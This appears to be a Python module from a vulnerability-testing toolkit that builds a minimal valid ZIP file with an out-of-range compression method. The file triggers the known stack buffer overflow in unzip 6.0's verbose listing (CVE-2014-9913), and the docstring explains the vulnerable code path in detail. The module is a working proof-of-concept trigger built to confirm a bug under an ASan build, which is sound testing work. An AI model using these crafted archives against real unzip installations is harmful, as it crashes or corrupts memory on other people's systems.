"""Directed trigger for a STACK buffer overflow behind the ZIP container format (CWE-121).

The shape, from unzip 6.0's `list_files` (CVE-2014-9913):

    char methbuf[8];                                          // list.c:119
    ...
    zfstrcpy(methbuf, method[methnum]);                       // "Unk:###" when the method is unknown
    } else if (methnum >= NUM_METHODS) {
        sprintf(&methbuf[4], "%03u", G.crec.compression_method);   // list.c:342

`compression_method` is a 16-bit central-directory field, 0..65535. When it is not one of the 17
known methods, `find_compr_idx` returns `NUM_METHODS`, the `method[]` table yields the 7-char
"Unk:###" placeholder, and `sprintf(&methbuf[4], "%03u", method)` renders the number at offset 4.
A method >= 1000 renders 4+ digits, so the 3-char minimum grows: 1000 writes 4 digits + NUL
(one byte past the 8-byte buffer), and a 5-digit method (>= 10000) writes two bytes past. Reached
by `unzip -v` (verbose list); the sibling `zi_short`/`zi_long` sinks are reached by `unzip -Z`.

A blind fuzzer almost never lands this: it has to keep a VALID ZIP container -- a local file
header, a central-directory record whose signature, offsets and lengths line up, and an
end-of-central-directory record pointing at it -- while setting one 2-byte field to an unusual
value. Random mutation breaks the central directory (so unzip rejects the archive before listing)
far more often than it lands an out-of-range method on an otherwise-intact record. But once a
detector has NARROWED to the method-rendering sink, the trigger is not a search: build the smallest
valid ZIP whose one entry carries an out-of-range compression method. That is what this module
does -- one construction, no campaign -- so the narrowed sink becomes a detonatable input the ASan
build reports as a stack-buffer-overflow WRITE (L1).

Only the central-directory method field is implemented here; the mechanism (a valid container with
one out-of-range field reaching a sink behind the parser) is the same for the other ZIP sinks
(the `EF_SMARTZIP` extra-field overlong-index byte of DEBIAN-1142905, the `-Z` method buffers),
and each is a short addition built on `zip_archive` below.
"""
from __future__ import annotations

import struct

# ZIP on-disk signatures (little-endian)
_SIG_LFH = 0x04034B50     # local file header
_SIG_CDH = 0x02014B50     # central directory file header
_SIG_EOCD = 0x06054B50    # end of central directory record

# A compression method that is NOT one of unzip's 17 known IDs (0..16 are used), so
# find_compr_idx returns NUM_METHODS and the "Unk:###" sprintf path renders it. Any value
# >= 1000 and outside the known set overflows; 0xF00D (61453) renders 5 digits -> 2 bytes past.
UNKNOWN_METHOD_1BYTE = 1000       # 4 digits -> writes one byte past methbuf[8]
UNKNOWN_METHOD_2BYTE = 0xF00D     # 5 digits -> writes two bytes past methbuf[8]


def zip_archive(*, method: int, name: bytes = b"A", extra_cd: bytes = b"",
                extra_lf: bytes = b"") -> bytes:
    """A minimal, valid single-entry ZIP: one local file header, one central-directory record
    (carrying `method` as its compression method and `extra_cd` as its extra field), and a
    matching end-of-central-directory record. `name` is the (short) stored file name.

    The archive is structurally valid -- unzip parses the central directory and lists the entry --
    which is the whole point: the trigger field rides inside a container the parser accepts.
    """
    if not (0 <= method <= 0xFFFF):
        raise ValueError("a ZIP compression method is a 16-bit field (0..65535)")
    nlen = len(name)
    lfh = struct.pack("<IHHHHHIIIHH",
                      _SIG_LFH, 20, 0, method, 0, 0, 0, 0, 0, nlen, len(extra_lf)) + name + extra_lf
    cdh = struct.pack("<IHHHHHHIIIHHHHHII",
                      _SIG_CDH, 20, 20, 0, method, 0, 0, 0, 0, 0,
                      nlen, len(extra_cd), 0, 0, 0, 0, 0) + name + extra_cd
    cd_off = len(lfh)
    cd_size = len(cdh)
    eocd = struct.pack("<IHHHHIIH", _SIG_EOCD, 0, 0, 1, 1, cd_size, cd_off, 0)
    return lfh + cdh + eocd


def zip_overmethod(*, two_byte: bool = True, name: bytes = b"A") -> bytes:
    """A valid ZIP whose single entry carries an out-of-range compression method, so `unzip -v`
    overflows `methbuf` at list.c:342. `two_byte` picks a 5-digit method (two bytes past) over a
    4-digit one (one byte past) -- the two-byte overrun is the more unambiguous ASan report."""
    return zip_archive(method=UNKNOWN_METHOD_2BYTE if two_byte else UNKNOWN_METHOD_1BYTE, name=name)
